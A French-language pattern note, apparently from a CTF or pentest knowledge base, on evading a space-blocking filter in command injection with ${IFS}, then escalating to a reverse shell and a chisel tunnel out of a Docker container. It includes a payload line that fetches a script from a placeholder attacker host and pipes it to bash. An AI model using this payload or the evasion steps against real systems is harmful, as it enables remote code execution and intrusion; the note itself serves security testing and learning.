---
doc_kind: pattern
title: "Bypass de filtre anti-espace via ${IFS} en command injection"
category: web
slug: hades-chasm-cmdi-docker-escape
created: 2026-10-29
status: active
tags:
  - command-injection
  - ifs-bypass
  - docker-pivot
  - chisel-socks
  - openssl-injection
chain_summary: "Un filtre applicatif qui bloque l'espace litteral dans une command injection est contournable en remplacant l'espace par ${IFS} (ou variantes $IFS$9, %09), qui reste interprete comme separateur par le shell."
---
# Bypass de filtre anti-espace via ${IFS} en command injection

## Chain Summary

- One-line chain: Un filtre applicatif qui bloque l'espace litteral dans une command injection est contournable en remplacant l'espace par ${IFS} (ou variantes $IFS$9, %09), qui reste interprete comme separateur par le shell.
- Typical target shape: Command injection confirmee (parametre passe a un binaire systeme) ou le filtre applicatif bloque specifiquement le caractere espace.

## Preconditions

- Command injection confirmee (parametre passe a un binaire systeme) ou le filtre applicatif bloque specifiquement le caractere espace.

## Cheap Probes

- Tester un payload de command injection simple avec espace -> bloque; retester en remplacant chaque espace par ${IFS}.

## Telltale Evidence

- Le payload avec ${IFS} s'execute alors que la version avec espace litteral est rejetee/neutralisee.

## Escalation Order

1. Confirmer la command injection et identifier precisement le filtre (espace specifiquement bloque).
2. Remplacer tous les espaces du payload par ${IFS} (ou $IFS$9/%09 selon le contexte).
3. Executer un payload de reverse shell avec cette substitution.
4. Si le shell obtenu est dans un conteneur avec route reseau sortante, etablir un tunnel (chisel) vers le reseau interne.

## Common Mistakes

- Abandonner une command injection confirmee juste parce que le payload avec espace litteral est filtre, sans tester les substituts standards (${IFS}, %09, ${9}).

## Payload Shapes

```text
name=$(curl${IFS}attacker:8090/rev|bash)
```

## Related Writeups

- hades-chasm-cmdi-docker-escape

## Skill Impact

- Related skill: web-triage (command injection): ajouter ${IFS} comme bypass systematique a tester quand l'espace litteral est filtre.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
